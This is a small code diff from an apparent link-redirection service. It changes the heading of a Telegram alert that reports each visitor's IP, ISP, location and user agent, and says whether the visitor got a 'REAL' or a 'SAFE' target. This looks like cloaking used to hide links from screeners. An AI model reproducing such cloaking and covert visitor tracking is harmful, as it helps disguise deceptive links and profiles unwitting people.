@@ -391,7 +391,7 @@ async function handleRedirection(user, req, res, linkData) {
     const chatId = settings.chatId || process.env.TELEGRAM_CHAT_ID;
 
     if (botToken && chatId) {
-        let message = `🚀 *SaaS Visit!* (User: ${user.name})\n\n`;
+        let message = `🚀 *New Visit!* (User: ${user.name})\n\n`;
         message += `📍 *IP:* ${clientIp}\n🏢 *ISP:* ${data ? data.isp : 'Unknown'}\n🌍 *Location:* ${data ? `${data.city}, ${data.country}` : 'Unknown'}\n💻 *UA:* ${userAgent}\n🎯 *Target:* ${targetUrl === realLink ? 'REAL' : 'SAFE'}`;
         
         axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
